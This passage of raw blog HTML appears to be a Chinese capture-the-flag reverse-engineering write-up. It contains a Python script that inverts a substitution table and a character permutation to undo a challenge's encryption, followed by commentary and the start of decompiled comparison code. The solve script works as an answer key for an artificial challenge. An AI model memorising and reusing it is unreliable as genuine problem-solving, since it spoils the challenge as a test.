data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">#get crypto table</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>s0_255 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x60</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x35</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x30</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x24</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x17</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x83</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x06</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x25</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x32</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x03</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x93</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x81</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x02</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x39</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x99</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x89</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x77</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x48</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x47</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x96</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x33</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x29</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x54</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x19</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x98</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x46</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x22</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x05</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x37</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x82</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x95</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>load_data <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xA7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x51</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x85</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x27</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x94</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x45</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x90</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x91</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xED</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x84</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x08</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xDF</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>crypto_table <span class=\"token operator\">=</span> <span class=\"token builtin\">dict</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>s0_255<span class=\"token punctuation\">,</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token comment\">#get order table</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>source <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;'</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>replaced <span class=\"token operator\">=</span> <span class=\"token string\">'HfVl&#123;qPcCYNMoRi6D7Jr&#125;espOL3FhwdWAtTGZba4Ugjvnx1QkKE2IS9yuz5BX08m'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>revsere_table <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">#index 是 source 在 replace 中的下标</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> source<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    revsere_table<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>replaced<span class=\"token punctuation\">.</span>find<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>tmp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x78</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x09</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x55</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xC3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x97</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xB9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xF6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x66</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x87</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xAE</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x53</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xEC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFC</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x88</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFB</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xCA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xD9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xA4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x01</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBA</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x3B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x92</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    tmp <span class=\"token operator\">=</span> decrypt<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> crypto_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    tmp <span class=\"token operator\">=</span> reverse_order<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">,</span> revsere_table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\"># 0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span></pre></td></tr></table></figure><p>以上脚本用于还原 排序 + 加密，tmp 的值就是经历过完整的打乱顺序和加密后 dump 出的，并不是最终的 cmp_data</p>\n<p>说明要么是比较数据还有操作 要么是 input 还有操作</p>\n<p>继续往后面看 比较逻辑</p>\n<p><img data-src=\"/images/image-20230910153719912.png\" alt=\"image-20230910153719912\"></p>\n<figure class=\"highlight cpp\"><figcaption data-lang=\"C++\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>like_i <span class=\"token operator\">=</span> <span class=\"token number\">4LL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">do</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    v77 <span class=\"token operator\">=</span> v84<span class=\"token punctuation\">;</span>                                  <span class=\"token comment\">// 0xff</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token 